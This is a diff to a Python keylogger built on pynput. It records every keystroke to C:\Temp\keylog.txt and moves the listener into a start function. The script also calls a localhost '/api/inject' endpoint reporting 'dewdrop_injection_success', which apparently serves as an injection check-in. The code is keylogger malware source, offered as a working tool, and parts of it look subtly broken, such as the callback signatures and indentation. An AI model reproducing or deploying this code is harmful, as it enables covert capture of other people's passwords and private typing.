@@ -10,9 +10,10 @@ Version: 1.0
 try:
     import requests
     import base64
+    import os
 except ImportError:
     print("Required modules not found. Please ensure 'requests' and 'pynput' are installed.")
-
+    input("Press Enter to exit...")
 
 KEYLOG = r"C:\Temp\keylog.txt"
 
@@ -22,21 +23,19 @@ def on_press(key, injected):
     try:
         print('alphanumeric key {} pressed; it was {}'.format(
             key.char, 'faked' if injected else 'not faked'))
-        
-        if key.state == keyboard.Key.space:
-            with open(KEYLOG, 'a') as f:
-                f.write(" ")
-        
-        elif key.state == keyboard.Key.enter:
-            with open(KEYLOG, 'a') as f:
-                f.write("\n")
-        
+    
+        # Regular character keys
         with open(KEYLOG, 'a') as f:
-            f.write(f"{key.char}")
-        
+            if key == keyboard.Key.space:
+                f.write(" ")
+            elif key == keyboard.Key.enter:
+                f.write("\n")
+            else:
+                f.write(key.char)
+                # f.write(f"[{key.name}]")  # for other special keys
     except AttributeError:
-        print('special key {} pressed'.format(
-            key))
+            print('special key {} pressed'.format(
+                key))
 
 def on_release(key, injected):
     print('{} released; it was {}'.format(
@@ -44,18 +43,6 @@ def on_release(key, injected):
     if key == keyboard.Key.esc:
         # Stop listener
         return False
-
-# Collect events until released
-with keyboard.Listener(
-        on_press=on_press,
-        on_release=on_release) as listener:
-    listener.join()
-
-# ...or, in a non-blocking fashion:
-listener = keyboard.Listener(
-    on_press=on_press,
-    on_release=on_release)
-listener.start()
 
 def start_keylogger():
     
@@ -65,26 +52,19 @@ def start_keylogger():
         os.remove(KEYLOG)
     
     open(KEYLOG, 'x').close()
-    
-    while True:
-        key = keyboard.read_event()
-        if key.event_type == keyboard.KEY_DOWN:
-            with open(KEYLOG, 'a') as f:
-                f.write(f"{key.name}")
-        
-        if keyboard.is_pressed('space'):
-            with open(KEYLOG, 'a') as f:
-                f.write(" ")
-            keyboard.wait('space')
-        
-        if keyboard.is_pressed('enter'):
-            with open(KEYLOG, 'a') as f:
-                f.write("\n")
-            keyboard.wait('enter')
 
-        if keyboard.is_pressed('esc'):
-            break
-    
+    # Collect events until released
+    with keyboard.Listener(
+            on_press=on_press,
+            on_release=on_release) as listener:
+        listener.join()
+
+    # ...or, in a non-blocking fashion:
+    listener = keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release)
+    listener.start()
+
 if __name__ == "__main__":
     requests.get("http://localhost:8080/api/inject?status=dewdrop_injection_success")
     start_keylogger()
